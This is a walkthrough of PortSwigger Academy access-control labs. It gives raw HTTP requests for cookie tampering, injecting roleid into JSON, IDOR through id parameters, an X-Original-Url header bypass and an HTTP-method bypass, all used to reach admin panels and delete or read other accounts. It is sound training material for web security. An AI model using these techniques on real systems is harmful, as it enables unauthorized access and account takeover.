# Access control vulnerabilities
- Author: [Mateusz Głuchowski](https://github.com/hue1337)
- Site: [PortSwigger Academy](https://portswigger.net/web-security/)

## Lab: Unprotected admin functionality
1. Find `robots.txt`
    ```
    User-agent: *
    Disallow: /administrator-panel
    ```
2. Access administrator panel and remove carlos.

## Lab: Unprotected admin functionality with unpredictable URLAPPRENTICE
1. Inspect the source of the website
    ```js
    if (isAdmin) {
    var topLinksTag = document.getElementsByClassName("top-links")[0];
    var adminPanelTag = document.createElement('a');
    adminPanelTag.setAttribute('href', '/admin-5157fg');
    adminPanelTag.innerText = 'Admin panel';
    topLinksTag.append(adminPanelTag);
    var pTag = document.createElement('p');
    pTag.innerText = '|';
    topLinksTag.appendChild(pTag);
    }
    ```
2. Access administrator panel and remove carlos.

## Lab: User role controlled by request parameter
1. Log in with `wiener:peter` credentials.
2. After looking into cookies we can see that `Admin` value is set to false. After changing it we are now able to access admin panel.
    ```
    GET /admin HTTP/2
    Host: 0a5a009403dbd0a9804949a9004700bc.web-security-academy.net
    Cookie: Admin=true; session=Jv3utCd0N3EbkNaneBKcWc2ffZXCz8YU
    Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
    ```
3. During traffic interception and constantly changing `Admin` value to true we can finally send the carlos account delete request:
    ```
    GET /admin/delete?username=carlos HTTP/2
    Host: 0a5a009403dbd0a9804949a9004700bc.web-security-academy.net
    Cookie: Admin=true; session=Jv3utCd0N3EbkNaneBKcWc2ffZXCz8YU
    ```

## Lab: User role can be modified in user profile
1. After inspecting different elements it appeared that we can add `roleid` to the json body during email submission. 
    ```json
    {
        "email":"wiener@normaln-user.net",
        "roleid":2
    }
    ```

2. After submitting new email out account's roleid has changed and we can delete carlos account.

## Lab: User ID controlled by request parameter
1. Log into the acc `wiener:peter`
2. Change the `id` in the url:
    ```
    https://0a3e003904eb84ac81aa3929008e006b.web-security-academy.net/my-account?id=carlos
    ```
3. Obtain `carlos` API key.

## Lab: User ID controlled by request parameter, with unpredictable user IDs
1. Log into the acc `wiener:peter`
2. To enumerate `carlos` API key we need his `userid`
3. Looking around the website we find his profile. (Thanks to the post he posted).
    ```
    ef89e7e5-2368-4916-a926-95e5647b2a97
    ```
4. Next step is to copy his userid from the url and paste int o `my-account` url:
    ```
    https://0a31005303a5159887baad2c0098005c.web-security-academy.net/my-account?id=ef89e7e5-2368-4916-a926-95e5647b2a97
    ```

5. Submit the answer.

## Lab: User ID controlled by request parameter with data leakage in redirect
1. Log in using `wiener:peter` credentials.
2. Change the username in body request to `carlos`.
3. Inspect the response and enjoy the anwer.
    ```html
    HTTP/2 302 Found
    Location: /login
    Content-Type: text/html; charset=utf-8
    Cache-Control: no-cache
    X-Frame-Options: SAMEORIGIN
    Content-Length: 3655
    ...
                        <h1>My Account</h1>
                        <div id=account-content>
                            <p>Your username is: carlos</p>
                            <div>Your API Key is: imKOFZdBKUxFJCdzMkEVJFErefVrLZr8</div><br/>
    ...
    </html>

    ```
## Lab: User ID controlled by request parameter with password disclosure
1. Change `id` to administrator:
    ```
    https://0a7d0023036efed682cd748c00a00004.web-security-academy.net/my-account?id=administrator
    ```

2. Check `value` in the password field.
3. Log in as the `administrator`.
Delete carlos's account

## Lab: Insecure direct object references
1. After downloading chat logs we can see the file is named `2.txt`. 
2. After inspecting the body request we can see that we request for `2.txt` file.
3. Sending `GET` request for `1.txt` file allows us to download it:
    ```
    CONNECTED: -- Now chatting with Hal Pline --
    You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
    Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
    You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
    Hal Pline: Takes one to know one
    You: Ok so my password is n5w431x02bxqh6jzax7x. Is that right?
    Hal Pline: Yes it is!
    You: Ok thanks, bye!
    Hal Pline: Do one!

    ```

4. We can see the password. After logging into carlos account we finish the lab.

## Lab: URL-based access control can be circumvented
1. After adding `X-Original-Url` with value `/admin` we were able to access **admin-panel**

    ```
    GET / HTTP/2
    Host: 0a7a00de046841d88374e6c90092006c.web-security-academy.net
    X-Original-Url: /admin
    ```
2. Looking into website source code we can see how the url with the deletion request is built.

    ```
    href="/admin/delete?username=carlos"
    ```
3. After preparing new request body I got the error: "Missing parameter 'username'". So I added username value at the bottom.  After refreshing the website we get information about completing the task.
    ```
    GET / HTTP/2
    Host: 0a7a00de046841d88374e6c90092006c.web-security-academy.net
    X-Original-Url: /admin/delete?username=carlos
    Cookie: session=0ZxlCXpZuOKWtHgsYjXIMX7s5ZknqiAQ
    Cache-Control: max-age=0
    Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "macOS"
    Accept-Language: en-GB,en;q=0.9
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://0a7a00de046841d88374e6c90092006c.web-security-academy.net/login
    Accept-Encoding: gzip, deflate, br
    Priority: u=0, i
    Content-Length: 15

    username=carlos
    ```
## Lab: Method-based access control can be circumvented
1. After logging into admin account I familiarized myself with this request:
    ```
    POST /admin-roles HTTP/2
    Host: 0a6b00830383ec1880fcda2500ae0049.web-security-academy.net
    Cookie: session=2v7rI08pDyyzMrV7ghKpwzgJ5g5RnX1C
    Content-Length: 30
    Cache-Control: max-age=0
    Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "macOS"
    Accept-Language: en-GB,en;q=0.9
    Origin: https://0a6b00830383ec1880fcda2500ae0049.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://0a6b00830383ec1880fcda2500ae0049.web-security-academy.net/admin
    Accept-Encoding: gzip, deflate, br
    Priority: u=0, i

    username=wiener&action=upgrade
    ```
2. I swapped the session cookie to wiener's. And received 401 response code. Changing to POSTX request and again to GET solved the task.
    ```
    GET /admin-roles?username=wiener&action=upgrade HTTP/2
    Host: 0a6b00830383ec1880fcda2500ae0049.web-security-academy.net
    Cookie: session=tSj2K1IBTvBdPi7LZ40NUh5QdvzyYWZz
    Cache-Control: max-age=0
    Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "macOS"
    Accept-Language: en-GB,en;q=0.9
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: none
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Accept-Encoding: gzip, deflate, br
    Priority: u=0, i

    ```


    